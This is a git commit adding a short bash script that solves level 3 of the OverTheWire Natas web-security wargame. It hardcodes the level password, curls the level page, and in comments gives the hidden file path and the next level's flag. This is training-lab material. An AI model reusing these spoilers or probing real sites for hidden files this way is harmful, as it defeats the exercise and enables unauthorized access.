410007ab471dc963c6577fd417a9e6630a51a4bf
Angel Darco <angel92-eme@hotmail.com>
2025-01-10 15:03:09 -0500

    :sparkles: natas 3 solved

---
+++ natas/natas3/level3.sh
@@ -0,0 +1,13 @@
+#!/bin/bash
+
+# Username: natas3
+  Password="3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH"
+
+# URL:
+ curl -s -u natas3:$Password http://natas3.natas.labs.overthewire.org
+
+# Code:
+# curl -s -u natas3:$Password http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
+
+# Flag:
+# QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
